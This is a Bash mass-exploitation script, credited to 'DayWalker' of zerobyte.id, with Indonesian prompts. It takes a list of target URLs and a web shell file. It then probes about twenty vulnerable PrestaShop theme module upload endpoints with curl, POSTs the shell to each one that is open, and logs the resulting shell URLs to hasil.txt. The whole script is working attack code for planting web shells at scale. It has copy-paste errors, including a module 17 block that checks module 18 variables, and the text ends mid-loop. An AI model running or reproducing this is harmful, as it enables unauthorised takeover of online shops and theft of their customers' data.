#!/bin/bash
# Title: Joomla Warehouse - Responsive Prestashop 1.6 Arbitrary File Upload
# Developer : iqit-commerce 
# Author: people_hurt
# Published : 21/06/2016
# Developer : iqit-commerce
# Link Download : https://themeforest.net/item/warehouse-responsive-prestashop-16-theme-blog/3178575
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
# 						Auto Exploit Warehouse All Modules
# 						Coded By xSuxHaxDax a.k.a DayWalker
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
clear
red='\033[0;31m'
cyan='\033[0;36m'
white='\033[1;37m'
NC='\033[0m'
useragent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/56.0";
cat << "EOF"
 _____              _           _         _     _ 
|__  /___ _ __ ___ | |__  _   _| |_ ___  (_) __| |
  / // _ \ '__/ _ \| '_ \| | | | __/ _ \ | |/ _` |
 / /|  __/ | | (_) | |_) | |_| | ||  __/_| | (_| |
/____\___|_|  \___/|_.__/ \__, |\__\___(_)_|\__,_|
                          |___/                   
----------- DayWalker [at] zerobyte.id ----------
-------Auto Exploit All Modules Warehouse--------
-------------------------------------------------	               	
EOF
#printf "${cyan}Auto Exploit Themes Warehouse All Modules\n\n"
printf "${red}ZEROB${white}YTE.id\n";
printf "${NC}\n"
echo -n "Masukan List : "; read list;
echo -n "Masukan Shell : "; read fshell;
banyak=$(cat "${list}" | wc -l);
printf "${red}LIST KAMAR TERLIHAT${white} ${banyak}\n ${NC}"

moduleslist=("columnadverts" \
			"soopamobile" \
			"soopabanners" \
			"vtermslideshow" \
			"vtemslideshow" \
			"simpleslideshow" \
			"productpageadverts" \
			"homepageadvertise" \
			"homepageadvertise2" \
			"jro_homepageadvertise" \
			"attributewizardpro" \
			"1attributewizardpro" \
			"attributewizardpro.OLD" \
			"psmodthemeoptionpanel" \
			"tdpsthemeoptionpanel" \
			"nvn_export_orders" \
			"pk_flexmenu" \
			"wdoptionpanel" \
			"fieldvmegamenu" \
			"wg24themeadministration" \
			"videostab" \
			"cartabandonmentproOld" \
			"cartabandonmentpro" \
			"advancedslider" \
			"attributewizardpro_x")
slist=$list
while zerobyte= read -r url
do 
	echo "NGITIPIN Kamar $url";
	kamar=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[0]}/uploadimage.php")
	intip=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[0]}/uploadimage.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar}" ] || [ "000" == "${kamar}" ] || [ "403" == "${kamar}" ] || [ "301" == "${kamar}" ] || [ "500" == "${kamar}" ] || [ "302" == "${kamar}" ]; then
		echo "JENDELA ${moduleslist[0]} TERTUTUP" 
elif
	[ "200" == "${kamar}" ] && [ "error" == "${intip}" ]; then
	echo "JENDELA ${moduleslist[0]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[0]} "
	# Save URL
	liatxploit=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[0]}/uploadimage.php" | egrep -o "success")
if [ "success" == "${liatxploit}" ]; then

	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[0]}/slides/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi
else
	printf ${red}
	echo "TERCYDUK ${moduleslist[0]} TERGEMBOK"
	fi
	printf ${NC}
	kamar1=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[1]}/uploadimage.php")
	intip1=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[1]}/uploadimage.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar1}" ] || [ "000" == "${kamar1}" ] || [ "403" == "${kamar1}" ] || [ "301" == "${kamar1}" ] || [ "500" == "${kamar1}" ] || [ "302" == "${kamar1}" ]; then
		echo "JENDELA ${moduleslist[1]} TERTUTUP" 
#false 
elif
	[ "200" == "${kamar1}" ] && [ "error" == "${intip1}" ]; then
	echo "JENDELA ${moduleslist[1]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[1]}"
	# Save URL
	liatxploit1=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[1]}/uploadimage.php" | egrep -o "success")
if [ "success" == "${liatxploit1}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[1]}/slides/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[1]} TERGEMBOK"
	fi
	printf ${NC}
	kamar2=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[2]}/uploadimage.php")
	intip2=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[2]}/uploadimage.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar2}" ] || [ "000" == "${kamar2}" ] || [ "403" == "${kamar2}" ] || [ "301" == "${kamar2}" ] || [ "500" == "${kamar2}" ] || [ "302" == "${kamar2}" ]; then
		echo "JENDELA ${moduleslist[2]} TERTUTUP" 
#false 
elif
	[ "200" == "${kamar2}" ] && [ "error" == "${intip2}" ]; then
	echo "JENDELA ${moduleslist[2]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[2]}"
	# Save URL
	liatxploit2=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[2]}/uploadimage.php" | egrep -o "success")
if [ "success" == "${liatxploit2}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[2]}/slides/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[2]} TELAH TERGEMBOK"
	fi
	printf ${NC}
	kamar3=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[3]}/uploadimage.php")
	intip3=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[3]}/uploadimage.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar3}" ] || [ "000" == "${kamar3}" ] || [ "403" == "${kamar3}" ] || [ "301" == "${kamar3}" ] || [ "500" == "${kamar3}" ] || [ "302" == "${kamar3}" ]; then
		echo "JENDELA ${moduleslist[3]} TERTUTUP" 
#false 
elif
	[ "200" == "${kamar3}" ] && [ "error" == "${intip3}" ]; then
	echo "JENDELA ${moduleslist[3]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[3]}"
	# Save URL
	liatxploit3=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[3]}/uploadimage.php" | egrep -o "success")
if [ "success" == "${liatxploit3}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[3]}/slides/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[3]} TERGEMBOK"
	fi
	printf ${NC}
	kamar4=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[4]}/uploadimage.php")
	intip4=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[4]}/uploadimage.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar4}" ] || [ "000" == "${kamar4}" ] || [ "403" == "${kamar4}" ] || [ "301" == "${kamar4}" ] || [ "500" == "${kamar4}" ] || [ "302" == "${kamar4}" ]; then
		echo "JENDELA ${moduleslist[4]} TERTUTUP" 
#false 
elif
	[ "200" == "${kamar4}" ] && [ "error" == "${intip4}" ]; then
	echo "JENDELA ${moduleslist[4]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[4]}"
	# Save URL
	liatxploit4=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[4]}/uploadimage.php" | egrep -o "success")
if [ "success" == "${liatxploit4}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[4]}/slides/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[4]} TERGEMBOK"
	fi
	printf ${NC}
	kamar5=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[5]}/uploadimage.php")
	intip5=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[5]}/uploadimage.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar5}" ] || [ "000" == "${kamar5}" ] || [ "403" == "${kamar5}" ] || [ "301" == "${kamar5}" ] || [ "500" == "${kamar5}" ] || [ "302" == "${kamar5}" ]; then
		echo "JENDELA ${moduleslist[5]} TERTUTUP" 
#false 
elif
	[ "200" == "${kamar5}" ] && [ "error" == "${intip5}" ]; then
	echo "JENDELA ${moduleslist[5]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[5]}"
	# Save URL
	liatxploit5=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[5]}/uploadimage.php" | egrep -o "success")
if [ "success" == "${liatxploit5}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[5]}/slides/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[5]} TERGEMBOK"
	fi
	printf ${NC}
	kamar6=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[6]}/uploadimage.php")
	intip6=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[6]}/uploadimage.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar6}" ] || [ "000" == "${kamar6}" ] || [ "403" == "${kamar6}" ] || [ "301" == "${kamar6}" ] || [ "500" == "${kamar6}" ] || [ "302" == "${kamar6}" ]; then
		echo "JENDELA ${moduleslist[6]} TERTUTUP" 
#false 
elif
	[ "200" == "${kamar6}" ] && [ "error" == "${intip6}" ]; then
	echo "JENDELA ${moduleslist[6]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[6]}"
	# Save URL
	liatxploit6=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[6]}/uploadimage.php" | egrep -o "success")
if [ "success" == "${liatxploit6}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[6]}/slides/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[6]} TERGEMBOK"
	fi
	printf ${NC}
	kamar7=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[7]}/uploadimage.php")
	intip7=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[7]}/uploadimage.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar7}" ] || [ "000" == "${kamar7}" ] || [ "403" == "${kamar7}" ] || [ "301" == "${kamar7}" ] || [ "500" == "${kamar7}" ] || [ "302" == "${kamar7}" ]; then
		echo "JENDELA ${moduleslist[7]} TERTUTUP" 
#false 
elif
	[ "200" == "${kamar7}" ] && [ "error" == "${intip7}" ]; then
	echo "JENDELA ${moduleslist[7]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[7]}"
	# Save URL
	liatxploit7=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[7]}/uploadimage.php" | egrep -o "success")
if [ "success" == "${liatxploit7}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[7]}/slides/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[7]} TERGEMBOK"
	fi
	printf ${NC}
	kamar8=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[8]}/uploadimage.php")
	intip8=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[8]}/uploadimage.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar8}" ] || [ "000" == "${kamar8}" ] || [ "403" == "${kamar8}" ] || [ "301" == "${kamar8}" ] || [ "500" == "${kamar8}" ] || [ "302" == "${kamar8}" ]; then
		echo "JENDELA ${moduleslist[8]} TERTUTUP" 
#false 
elif
	[ "200" == "${kamar8}" ] && [ "error" == "${intip8}" ]; then
	echo "JENDELA ${moduleslist[8]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[8]}"
	# Save URL
	liatxploit8=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[8]}/uploadimage.php" | egrep -o "success")
if [ "success" == "${liatxploit8}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[8]}/slides/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[8]} TERGEMBOK"
	fi
	printf ${NC}
	kamar9=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[9]}/uploadimage.php")
	intip9=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[9]}/uploadimage.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar9}" ] || [ "000" == "${kamar9}" ] || [ "403" == "${kamar9}" ] || [ "301" == "${kamar9}" ] || [ "500" == "${kamar9}" ] || [ "302" == "${kamar9}" ]; then
		echo "JENDELA ${moduleslist[9]} TERTUTUP" 
#false 
elif
	[ "200" == "${kamar9}" ] && [ "error" == "${intip9}" ]; then
	echo "JENDELA ${moduleslist[9]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[9]}"
	# Save URL
	liatxploit9=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[9]}/uploadimage.php" | egrep -o "success")
if [ "success" == "${liatxploit9}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[9]}/slides/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[9]} TERGEMBOK"
	fi
	printf ${NC}
	kamar10=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[10]}/file_upload.php")
	intip10=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[10]}/file_upload.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar10}" ] || [ "000" == "${kamar10}" ] || [ "403" == "${kamar10}" ] || [ "301" == "${kamar10}" ] || [ "500" == "${kamar10}" ] || [ "302" == "${kamar10}" ]; then
		echo "JENDELA ${moduleslist[10]} TERTUTUP" 
#false 
elif
	[ "200" == "${kamar10}" ] && [ "error" == "${intip10}" ]; then
	echo "JENDELA ${moduleslist[10]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[10]}"
	# Save URL
	liatxploit10=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[10]}/file_upload.php" | egrep -o "success")
if [ "success" == "${liatxploit10}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[10]}/file_uploads/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[10]} TERGEMBOK"
	fi
	printf ${NC}
	kamar11=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[11]}/file_upload.php")
	intip11=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[11]}/file_upload.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar11}" ] || [ "000" == "${kamar11}" ] || [ "403" == "${kamar11}" ] || [ "301" == "${kamar11}" ] || [ "500" == "${kamar11}" ] || [ "302" == "${kamar11}" ]; then
		echo "JENDELA ${moduleslist[11]} TERTUTUP" 
#false 
elif
	[ "200" == "${kamar11}" ] && [ "error" == "${intip11}" ]; then
	echo "JENDELA ${moduleslist[11]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[11]}"
	# Save URL
	liatxploit11=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[11]}/file_upload.php" | egrep -o "success")
if [ "success" == "${liatxploit11}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[11]}/file_uploads/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[11]} TERGEMBOK"
	fi
	printf ${NC}
	kamar12=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[12]}/file_upload.php")
	intip12=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[12]}/file_upload.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar12}" ] || [ "000" == "${kamar12}" ] || [ "403" == "${kamar12}" ] || [ "301" == "${kamar12}" ] || [ "500" == "${kamar12}" ] || [ "302" == "${kamar12}" ]; then
		echo "JENDELA ${moduleslist[12]} TERTUTUP" 
#false 
elif
	[ "200" == "${kamar12}" ] && [ "error" == "${intip12}" ]; then
	echo "JENDELA ${moduleslist[12]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[12]}"
	# Save URL
	liatxploit12=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[12]}/file_upload.php" | egrep -o "success")
if [ "success" == "${liatxploit12}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[12]}/file_uploads/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[12]} TERGEMBOK"
	fi
	printf ${NC}
	kamar13=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[13]}/file_upload.php")
	intip13=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[13]}/file_upload.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar13}" ] || [ "000" == "${kamar13}" ] || [ "403" == "${kamar13}" ] || [ "301" == "${kamar13}" ] || [ "500" == "${kamar13}" ] || [ "302" == "${kamar13}" ]; then
		echo "JENDELA ${moduleslist[13]} TERTUTUP" 
#false 
elif
	[ "200" == "${kamar13}" ] && [ "error" == "${intip13}" ]; then
	echo "JENDELA ${moduleslist[13]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[13]}"
	# Save URL
	liatxploit13=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[13]}/psmodthemeoptionpanel_ajax.php" | egrep -o "success")
if [ "success" == "${liatxploit13}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[13]}/upload/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[13]} TERGEMBOK"
	fi
	printf ${NC}
	kamar14=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[14]}/psmodthemeoptionpanel_ajax.php")
	intip14=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[14]}/psmodthemeoptionpanel_ajax.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar14}" ] || [ "000" == "${kamar14}" ] || [ "403" == "${kamar14}" ] || [ "301" == "${kamar14}" ] || [ "500" == "${kamar14}" ] || [ "302" == "${kamar14}" ]; then
		echo "JENDELA ${moduleslist[14]} TERTUTUP" 
#false
elif
	[ "200" == "${kamar14}" ] && [ "error" == "${intip14}" ]; then
	echo "JENDELA ${moduleslist[14]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[14]}"
	# Save URL
	liatxploit14=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[14]}/tdpsthemeoptionpanelAjax.php" | egrep -o "success")
if [ "success" == "${liatxploit14}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[14]}/upload/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[14]} TERGEMBOK"
	fi
	printf ${NC}
	kamar15=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[15]}/tdpsthemeoptionpanelAjax.php")
	intip15=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[15]}/tdpsthemeoptionpanelAjax.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar15}" ] || [ "000" == "${kamar15}" ] || [ "403" == "${kamar15}" ] || [ "301" == "${kamar15}" ] || [ "500" == "${kamar15}" ] || [ "302" == "${kamar15}" ]; then
		echo "JENDELA ${moduleslist[15]} TERTUTUP" 
#false
elif
	[ "200" == "${kamar15}" ] && [ "error" == "${intip15}" ]; then
	echo "JENDELA ${moduleslist[15]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[15]}"
	# Save URL
	liatxploit15=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[15]}/upload.php" | egrep -o "success")
if [ "success" == "${liatxploit15}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[15]}/nvn_export_orders/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[15]} TERGEMBOK"
	fi
	printf ${NC}
	kamar16=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[16]}/upload.php")
	intip16=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[16]}/upload.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar16}" ] || [ "000" == "${kamar16}" ] || [ "403" == "${kamar16}" ] || [ "301" == "${kamar16}" ] || [ "500" == "${kamar16}" ] || [ "302" == "${kamar16}" ]; then
		echo "JENDELA ${moduleslist[16]} TERTUTUP" 
#false
elif
	[ "200" == "${kamar16}" ] && [ "error" == "${intip16}" ]; then
	echo "JENDELA ${moduleslist[16]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[16]}"
	# Save URL
	liatxploit16=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[16]}/ajax/upload.php" | egrep -o "success")
if [ "success" == "${liatxploit16}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[16]}/uploads/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[16]} TERGEMBOK"
	fi
	printf ${NC}
	kamar17=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[17]}/ajax/upload.php")
	intip17=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[17]}/ajax/upload.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar17}" ] || [ "000" == "${kamar17}" ] || [ "403" == "${kamar17}" ] || [ "301" == "${kamar17}" ] || [ "500" == "${kamar17}" ] || [ "302" == "${kamar17}" ]; then
		echo "JENDELA ${moduleslist[17]} TERTUTUP" 
#false
elif
	[ "200" == "${kamar18}" ] && [ "error" == "${intip18}" ]; then
	echo "JENDELA ${moduleslist[18]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[18]}"
	# Save URL
	liatxploit18=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[18]}/wdoptionpanel_ajax.php" | egrep -o "success")
if [ "success" == "${liatxploit18}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[18]}/upload/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[18]} TERGEMBOK"
	fi
	printf ${NC}
	kamar19=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[19]}/wdoptionpanel_ajax.php")
	intip19=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[19]}/wdoptionpanel_ajax.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar19}" ] || [ "000" == "${kamar19}" ] || [ "403" == "${kamar19}" ] || [ "301" == "${kamar19}" ] || [ "500" == "${kamar19}" ] || [ "302" == "${kamar19}" ]; then
		echo "JENDELA ${moduleslist[19]} TERTUTUP" 
#false
elif
	[ "200" == "${kamar19}" ] && [ "error" == "${intip19}" ]; then
	echo "JENDELA ${moduleslist[19]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[19]}"
	# Save URL
	liatxploit19=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[19]}/ajax/upload.php" | egrep -o "success")
if [ "success" == "${liatxploit19}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[19]}/uploads/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[19]} TERGEMBOK"
	fi
	printf ${NC}
	kamar20=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[20]}/ajax/upload.php")
